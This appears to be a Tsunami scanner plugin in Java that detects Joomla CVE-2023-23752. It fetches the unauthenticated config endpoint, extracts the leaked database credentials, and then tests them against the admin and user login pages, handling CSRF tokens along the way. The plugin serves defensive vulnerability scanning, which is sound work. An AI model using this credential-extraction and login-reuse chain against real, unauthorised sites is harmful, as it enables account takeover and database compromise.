/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202323752;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.net.HttpHeaders.*;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonSyntaxException;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionReportList.Builder;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URL;
import java.net.UnknownHostException;
import java.net.http.HttpRequest;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.inject.Inject;
import com.google.auto.value.AutoValue;

@AutoValue
abstract class ScanResults {

  abstract String dataBaseUsername();

  abstract String dataBasePassword();

  abstract String dataBaseHost();

  abstract String leakedResponse();

  abstract boolean isPublicDatabaseHost();

  abstract boolean compromisedAdminAccount();

  abstract boolean compromisedUserAccount();

  abstract boolean isSuccessful();

  static Builder builder() {

    return new AutoValue_ScanResults.Builder()
        .setIsSuccessful(false)
        .setIsPublicDatabaseHost(false)
        .setDataBaseUsername("")
        .setDataBasePassword("")
        .setLeakedResponse("")
        .setDataBaseHost("")
        .setCompromisedUserAccount(false)
        .setCompromisedAdminAccount(false);
  }

  @AutoValue.Builder
  abstract static class Builder {

    abstract Builder setIsPublicDatabaseHost(boolean value);

    abstract Builder setIsSuccessful(boolean value);

    abstract Builder setDataBaseUsername(String value);

    abstract Builder setDataBasePassword(String value);

    abstract Builder setDataBaseHost(String value);

    abstract Builder setLeakedResponse(String value);

    abstract Builder setCompromisedAdminAccount(boolean value);

    abstract Builder setCompromisedUserAccount(boolean value);

    abstract ScanResults build();
  }
}

/** A {@link VulnDetector} that detects the CVE-2023-23752 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Cve202323752VulnDetector",
    version = "0.1",
    description =
        "CVE-2023-23752: An improper access check allows unauthorized access to webservice"
            + " endpoints",
    author = "Am0o0",
    bootstrapModule = Cve202323752DetectorBootstrapModule.class)
public final class Cve202323752VulnDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  @VisibleForTesting
  static final String VULNERABLE_PATH = "api/index.php/v1/config/application?public=true";

  @VisibleForTesting static final String DETECTION_STRING_1 = "password";
  @VisibleForTesting static final String DETECTION_STRING_2 = "user";
  @VisibleForTesting static final int DETECTION_STRING_BY_STATUS = HttpStatus.OK.code();
  private final HttpClient httpClient;
  private final Clock utcClock;

  @Inject
  Cve202323752VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
  }

  private static StringBuilder buildTarget(NetworkService networkService) {
    StringBuilder targetUrlBuilder = new StringBuilder();
    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
    } else {
      targetUrlBuilder
          .append("http://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    return targetUrlBuilder;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2023-23752 starts detecting.");

    Builder detectionReport = DetectionReportList.newBuilder();
    matchedServices.stream()
        .filter(NetworkServiceUtils::isWebService)
        .forEach(
            networkService -> {
              ScanResults results = isServiceVulnerable(networkService);
              if (results.isSuccessful()) {
                detectionReport.addDetectionReports(
                    buildDetectionReport(targetInfo, networkService, results));
              }
            });
    return detectionReport.build();
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService, ScanResults results) {
    StringBuilder ScanResultReport = new StringBuilder();

    ScanResultReport.append("Full Leaked Response:\n")
        .append(results.leakedResponse())
        .append("\n");
    ScanResultReport.append("The leaked credentials are: \n")
        .append("Database Password:\n")
        .append(results.dataBasePassword())
        .append("\n")
        .append("Database UserName:\n")
        .append(results.dataBaseUsername())
        .append("\n");

    if (results.isPublicDatabaseHost()) {
      ScanResultReport.append(
              "The dataBase host is Accessible to Public Because it has a public IP address, "
                  + "Attackers can leverage leaked DataBase credentials to login into your DataBase, The DataBase HostName is: ")
          .append(results.dataBaseHost())
          .append("\n");
    }

    if (results.compromisedAdminAccount()) {
      ScanResultReport.append(
              "Scanner has checked the credentials against Administrator login page "
                  + "and Leaked credentials had used as a Joomla Administrator credentials")
          .append("\n");
    }

    if (results.compromisedUserAccount()) {
      ScanResultReport.append(
              "Scanner has checked the credentials against Users login page "
                  + "and Leaked credentials had used as a Joomla User credentials")
          .append("\n");
    }

    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2023_23752"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Joomla unauthorized access to webservice endpoints")
                .setDescription(
                    "CVE-2023-23752: An improper access check allows unauthorized access to"
                        + " webservice endpoints. attacker can get critical information of database and webserver like passwords by this vulnerability")
                .setRecommendation("Upgrade to version 4.2.8 and higher")
                .addAdditionalDetails(
                    AdditionalDetail.newBuilder()
                        .setTextData(TextData.newBuilder().setText(ScanResultReport.toString()))))
        .build();
  }

  private ScanResults isServiceVulnerable(NetworkService networkService) {
    ScanResults.Builder results = ScanResults.builder();
    HttpHeaders httpHeaders =
        HttpHeaders.builder()
            .addHeader(CONTENT_TYPE, "text/plain; charset=UTF-8")
            .addHeader(
                ACCEPT,
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
            .addHeader(UPGRADE_INSECURE_REQUESTS, "1")
            .addHeader(ACCEPT_LANGUAGE, "Accept-Language: en-US,en;q=0.5")
            .addHeader(ACCEPT_ENCODING, "gzip, deflate")
            .build();

    String targetUrl = buildTarget(networkService).append(VULNERABLE_PATH).toString();
    try {
      HttpResponse httpResponse =
          httpClient.send(get(targetUrl).setHeaders(httpHeaders).build(), networkService);

      // immediate checks for faster scanning
      if (httpResponse.status().code() != DETECTION_STRING_BY_STATUS
          || httpResponse.bodyJson().isEmpty()
          || httpResponse.bodyString().isEmpty()) {
        return results.build();
      }

      // check for body values match our detection rules
      // and save leaked credentials
      if (httpResponse.bodyString().get().contains(DETECTION_STRING_1)
          && httpResponse.bodyString().get().contains(DETECTION_STRING_2)) {
        results.setIsSuccessful(true);
        results.setLeakedResponse(httpResponse.bodyString().get());

        JsonObject jsonResponse = (JsonObject) httpResponse.bodyJson().get();
        if (jsonResponse.keySet().contains("data")) {
          JsonArray jsonArray = jsonResponse.getAsJsonArray("data");
          for (int i = 0; i < jsonArray.size(); i++) {
            if (jsonArray.get(i).getAsJsonObject().keySet().contains("attributes")) {
              JsonObject tmp =
                  jsonArray.get(i).getAsJsonObject().get("attributes").getAsJsonObject();
              if (tmp.keySet().contains(("user"))) {
                results.setDataBaseUsername(tmp.get("user").getAsString());
              }
              if (tmp.keySet().contains(("password"))) {
                results.setDataBasePassword(tmp.get("password").getAsString());
              }
              if (tmp.keySet().contains(("host"))) {
                results.setDataBaseHost(tmp.get("host").getAsString());
                results.setIsPublicDatabaseHost(IsPublicHost(results.build().dataBaseHost()));
              }
            }
          }
        }

        // Check leaked Credentials if administrator has used them in some other entries
        if (!results.build().dataBaseUsername().isEmpty()
            && !results.build().dataBasePassword().isEmpty()) {
          results.setCompromisedAdminAccount(
              checkJoomlaAdminsLogin(
                  buildTarget(networkService),
                  results.build().dataBaseUsername(),
                  results.build().dataBasePassword()));
          results.setCompromisedUserAccount(
              checkJoomlaUsersLogin(
                  buildTarget(networkService),
                  results.build().dataBaseUsername(),
                  results.build().dataBasePassword()));
        }

        return results.build();
      }
    } catch (JsonSyntaxException | IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return results.build();
    } catch (InterruptedException e) {
      throw new RuntimeException(e);
    }
    return results.build();
  }

  public static boolean checkJoomlaAdminsLogin(
      StringBuilder url, String dataBaseUsername, String dataBasePassword)
      throws IOException, InterruptedException {
    return checkJoomlaLogin(
        url + "administrator/",
        url + "administrator/index.php",
        "username="
            + dataBaseUsername
            + "&passwd="
            + dataBasePassword
            + "&option=com_login&task=login",
        "Set-Cookie");
  }

  public static boolean checkJoomlaUsersLogin(
      StringBuilder url, String dataBaseUsername, String dataBasePassword)
      throws IOException, InterruptedException {
    return checkJoomlaLogin(
        url.toString(),
        url.append("index.php").toString(),
        "username="
            + dataBaseUsername
            + "&password="
            + dataBasePassword
            + "&Submit=&option=com_users&task=user.login",
        "joomla_user_state=logged_in;");
  }

  public static boolean checkJoomlaLogin(
      String initialUrl, String loginUrl, String body, String finalResponseMatcher)
      throws IOException, InterruptedException {

    java.net.http.HttpClient httpClient =
        java.net.http.HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(2)).build();
    HttpRequest request =
        HttpRequest.newBuilder()
            .GET()
            .uri(URI.create(initialUrl))
            .setHeader(
                ACCEPT,
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
            .setHeader(
                "User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36")
            .setHeader("Cache-Control", "max-age=0")
            .build();
    java.net.http.HttpResponse<String> httpResponse =
        httpClient.send(request, java.net.http.HttpResponse.BodyHandlers.ofString());

    // get some hidden parameter values
    String returnToken = null;
    Pattern returnTokenPattern =
        Pattern.compile("<input type=\"hidden\" name=\"return\" value=\"(.+?)\">");
    Matcher matcher = returnTokenPattern.matcher(httpResponse.body());
    if (matcher.find()) {
      returnToken = matcher.group(1);
    } else return false;

    // get CSRF token method 1
    String csrfToken = null;
    Pattern csrfPattern = Pattern.compile("<input type=\"hidden\" name=\"(.+?)\" value=\"1\">");
    matcher = csrfPattern.matcher(httpResponse.body());
    if (matcher.find()) {
      csrfToken = matcher.group(1);
    } else return false;

    // get PreAuth Cookies
    if (httpResponse.headers().firstValue("Set-Cookie").isEmpty()) {
      return false;
    }
    String cookies = httpResponse.headers().firstValue("Set-Cookie").get();

    request =
        HttpRequest.newBuilder()
            .POST(
                HttpRequest.BodyPublishers.ofString(
                    body + "&return=" + returnToken + "&" + csrfToken + "=1"))
            .uri(URI.create(loginUrl))
            .setHeader(
                ACCEPT,
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
            .setHeader(
                "User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36")
            .setHeader("Cache-Control", "max-age=0")
            .setHeader("Cookie", cookies)
            .setHeader("Content-Type", "application/x-www-form-urlencoded")
            .build();

    httpResponse = httpClient.send(request, java.net.http.HttpResponse.BodyHandlers.ofString());

    return httpResponse.headers().toString().contains(finalResponseMatcher)
        || httpResponse.headers().toString().contains(finalResponseMatcher.toLowerCase())
        || httpResponse.body().contains(finalResponseMatcher)
        || httpResponse.body().contains(finalResponseMatcher.toLowerCase());
  }

  public static boolean IsPublicHost(String url) {
    if (url != null) {
      if (!url.contains(".")) {
        return false;
      }
      try {
        InetAddress address = null;
        String host = "";
        String hostAddress = "";
        if (url.contains(":")) {
          // It is a URL and has protocol/scheme (https/http)
          URL parsedUrl = new URL(url);
          host = parsedUrl.getHost();
          address = InetAddress.getByName(host);
        } else {
          // it isn't a URL and only contains hostname
          address = InetAddress.getByName(url);
        }
        hostAddress = address.getHostAddress();
        host = host.toLowerCase();

        return !address.isAnyLocalAddress()
            && !address.isLoopbackAddress()
            && !address.isLinkLocalAddress()
            && !host.endsWith(".internal") // Redundant
            && !host.endsWith(".local") // Redundant
            && !host.contains("localhost") // Redundant
            && !hostAddress.startsWith("0.") // 0.0.0.0/8
            && !hostAddress.startsWith("10.") // 10.0.0.0/8
            && !hostAddress.startsWith("127.") // 127.0.0.0/8
            && !hostAddress.startsWith("169.254.") // 169.254.0.0/16
            && !hostAddress.startsWith("172.16.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.17.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.18.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.19.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.20.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.21.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.22.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.23.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.24.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.25.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.26.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.27.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.28.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.29.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.30.") // 172.16.0.0/12
            && !hostAddress.startsWith("172.31.") // 172.16.0.0/12
            && !hostAddress.startsWith("192.0.0.") // 192.0.0.0/24
            && !hostAddress.startsWith("192.168.") // 192.168.0.0/16
            && !hostAddress.startsWith("198.18.") // 198.18.0.0/15
            && !hostAddress.startsWith("198.19.") // 198.18.0.0/15
            && !hostAddress.startsWith("fc00::") // fc00::/7
            // https://stackoverflow.com/questions/53764109/is-there-a-java-api-that-will-identify-the-ipv6-address-fd00-as-local-private
            && !hostAddress.startsWith("fd00::") // fd00::/8
            && !host.endsWith(".arpa"); // reverse domain (needed?)
      } catch (MalformedURLException | UnknownHostException e) {
        return false;
      }
    } else {
      return false;
    }
  }
}
